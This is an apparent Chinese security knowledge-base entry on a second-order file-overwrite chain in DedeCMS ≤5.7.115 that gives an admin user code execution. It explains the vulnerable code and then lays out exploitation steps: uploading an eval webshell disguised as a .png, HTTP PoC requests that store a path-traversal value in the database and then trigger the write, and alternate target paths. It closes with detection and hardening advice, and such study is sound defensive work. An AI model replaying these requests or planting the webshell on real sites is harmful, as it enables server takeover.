---
id: web-php-rce-dedecms-homepageset-task-do-stored-file-write
title: DedeCMS ≤5.7.115 二阶任意文件覆盖：makehtml_homepage 写 homepageset 表 + task_do.php makeindex 触发 getshell
type: scenario
domain: web
path: web/php/rce
technique: dedecms-homepageset-stored-position-file-write
tags:
- php
- dedecms
- cms
- rce
- file-write
- stored
- second-order
- template
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: DeDeCMS <=5.7.115
verification:
  verified_by: verifier-T1-19
  verified_at: '2026-11-08T12:08:25+08:00'
  notes: 已对照原文核对：img32/36 确认 /templets 上传 phpinfo.png，img38 请求 dopost=make&saveset=1&templet=phpinfo.png&position=../1.php，img42 确认 dede_homepageset 表已改，img46 task_do.php dopost=makeindex 触发，img48 根目录生成 1.php，img50 phpinfo 执行、img52 shell 连接成功，二阶链完整。affected_versions=DeDeCMS <=5.7.115 为原文「影响版本」节原文标注。未验证点：PoC 未在本机复现。
url: /docs/web/php/rce/web-php-rce-dedecms-homepageset-task-do-stored-file-write/
draft: false
kb_aliases:
- DedeCMS 二阶文件覆盖
- task_do.php makeindex getshell
- dede_homepageset 表被改写
- DedeCMS 5.7.115 后台 RCE
- 存储型任意文件写入
---

## 一句话结论

DedeCMS ≤ 5.7.115 把「首页模板 + 输出路径」存进 `dede_homepageset` 表，`makehtml_homepage.php` 的 `saveset=1` 分支可用请求参数直接 UPDATE 这两列（`position` 无过滤），而 `task_do.php` 的 `dopost=makeindex` 会从该表读回这两个值并执行「读模板 → 写目标路径」；于是「上传模板图片马 → 写库改 position=../1.php → 触发任务」三步就能在站点根目录生成 PHP 文件，形成二阶利用链。

## 原理

- **为什么要分两步**：在 5.7.115 中，`makehtml_homepage.php` 对 `templet` 仍有 `preg_replace("/[.]+[\/\\\\]+/","/",...)` 过滤，且生成动作受 `showmod` 等分支约束；但同一文件的 `$saveset==1` 分支只把两个参数拼进 SQL：
  `UPDATE \`#@__homepageset\` SET templet='$templet',position='$position'`，
  对 `position` 没有任何校验。参数一旦落库，就脱离了本次请求的上下文限制。
- **触发点在另一个文件**：`/dede/task_do.php` 的 `$dopost=='makeindex'` 分支 `SELECT * FROM \`#@__homepageset\`` 取回 `templet`/`position`，然后
  `$homeFile = dirname(__FILE__).'/'.$row['position']`、
  `$tpl = $cfg_basedir.$cfg_templets_dir.'/'.$templet`，
  再 `$pv->SetTemplet($tpl); $pv->SaveToHtml($homeFile);`。`dirname(__FILE__)` 是 `/dede`，所以 `position=../1.php` 得到站点根目录的 `/1.php`。
- **写入内容从哪来**：`SetTemplet` → `LoadTemplet` → `LoadTemplate` 把 `$tpl` 逐行读入 `$this->SourceString`；`SaveToHtml` → `SaveTo` → `fwrite($fp,$this->GetResult())`，而 `GetResult()` 在 `$this->Count==-1`（模板中无标签）时原样返回 `SourceString`。因此写入的字节 = 模板文件的字节。
- **模板可控**：`templet` 被限制在 `$cfg_templets_dir`（`/dede/templets/`）内，但后台「模块 → 文件管理器」可把内容为 `<?php @eval($_POST['a']);?>` 的文件以 `.png` 上传到该目录，页面显示文件存在、内容不被检查。这样「读的源」与「写的目标」同时可控。
- **为什么等价于 RCE**：`fopen($homeFile,'w')` 对不存在文件会创建，故不必先存在 `1.php`；写入后 `/1.php` 位于 Web 根、由 PHP 解析，访问即执行。整链只用后台合法功能（文件管理器、生成首页、任务脚本），无内存破坏或反序列化。
- **顺带风险**：上述 UPDATE 是字符串拼接，`templet`/`position` 中若带单引号还可影响 SQL 结构；本草稿只记录文件写入链，SQL 注入不作为独立结论。

## 触发条件

- 目标为 DedeCMS ≤ 5.7.115，攻击者拥有后台会话。
- `dede/templets/` 可写、可通过文件管理器上传图片文件。
- `dede/task_do.php` 可访问（后台页面正常加载即可），且 Web 进程对站点根目录有写权限。

## 利用步骤

1. 登录后台，用「模块 → 文件管理器」在 `/dede/templets/` 上传 `phpinfo.png`，内容为 `<?php phpinfo();?>` 或一句话木马。
2. 请求 `makehtml_homepage.php`，用 `saveset=1` 把模板名与目标路径写入 `dede_homepageset`：`dopost=make&saveset=1&templet=phpinfo.png&position=../1.php`。
3. 在数据库工具中确认 `dede_homepageset` 的 `templet` / `position` 已变为 `phpinfo.png` / `../1.php`（可选，用于排错）。
4. 请求 `task_do.php`：`dopost=makeindex`，触发 `SetTemplet` + `SaveToHtml`，在根目录生成 `1.php`。
5. 访问 `/1.php` 验证代码执行，再用客户端连接获取 shell。
6. 若根目录不可写，把 `position` 改为其他可写目录（如 `../uploads/x.php`、`../data/x.php`）逐一尝试。

## PoC

```http
# 第 1 步：写入模板名与目标路径
POST /dede/makehtml_homepage.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<admin-session>; DedeUserID=1; DedeLoginTime=<ts>

dopost=make&saveset=1&templet=phpinfo.png&position=../1.php
```

```http
# 第 2 步：触发模板内容回写
POST /dede/task_do.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<admin-session>; DedeUserID=1; DedeLoginTime=<ts>

dopost=makeindex
```

```text
# 前置：/dede/templets/phpinfo.png 内容为 <?php phpinfo();?>
# 结果：站点根目录出现 1.php，内容与 phpinfo.png 相同
```

## 变体与关联

- 变体：不改库而直接改 `position` 也可用 5.7.113 的 `dopost=make&showmod=1` 一步完成，见 [[web-php-rce-dedecms-makehtml-homepage-position-file-write]]；二阶版本的差别在于参数先持久化、由任务脚本延时触发，适合绕过只检查「生成首页」单次请求的审计规则。
- 变体：除 `task_do.php` 外，后台其他「按 homepageset 生成首页」的入口（如 `makehtml_all.php`）也会读同一行数据，可作为替代触发器。
- 关联：[[web-php-rce-dedecms-template-tag-source-substr-replace-waf-bypass]]（后台标签源码写 PHP）、[[web-generic-file-upload-dedecms-template-rename-php-waf-fileread]]（模板上传改名）。

## 检测与防御

- 检测：`makehtml_homepage.php` 请求中出现 `saveset=1` 且 `position` 含 `..`；`dede_homepageset` 表的 `position` 出现相对路径或 `.php`；随后短时间访问 `task_do.php?dopost=makeindex`；根目录新增 `.php` 且内容以图片魔数或 `<?php` 开头。
- 防御：写入数据库前对 `position` 做白名单（只允许 `index.html` 一类固定文件名）与 `realpath` 目录校验；`task_do.php` 读库后再次校验目标路径，禁止 `..`；模板目录不可被上传功能写入；升级到官方修复版本。
- 加固：后台操作二次认证与操作审计；Web 目录对 PHP 只给最小写权限；对后台关键表变更做监控。
